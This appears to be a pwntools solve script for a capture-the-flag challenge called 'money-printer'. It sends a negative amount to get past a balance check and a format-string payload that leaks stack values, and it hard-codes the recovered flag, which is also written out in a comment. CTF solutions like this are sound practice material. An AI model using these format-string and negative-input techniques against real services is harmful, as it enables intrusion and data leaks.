#!/usr/bin/python3
from pwn import *

BINARY = './money-printer'

elf = context.binary = ELF(BINARY, checksec=False)

def start():
    if args.GDB:
        return gdb.debug(elf.path)
    if args.REMOTE:
        return remote("money.sdc.tf", 1337)
    else:
        return process(elf.path)

io = start()

# bypass the money check
io.sendline(b"-1000")
# offset 16
io.sendline(b"%10$p.%11$p.%12%p.%13$p.%14$p.%15$p")
# The flag is inside the stack just unhex the chars
flag = b""
flag += unhex("34647b6674636473")[::-1]
flag += unhex("665f7530795f6e6d")[::-1]
flag += unhex("435f345f446e7530")[::-1]
flag += unhex("304d345f597a3472")[::-1]
flag += unhex("4d5f66305f374e75")[::-1]
flag += unhex("7d79336e30")[::-1]
# sdctf{d4mn_y0u_f0unD_4_Cr4zY_4M0uN7_0f_M0n3y}
info(f"Flag: {flag.decode()}")
io.recvall()


io.interactive()
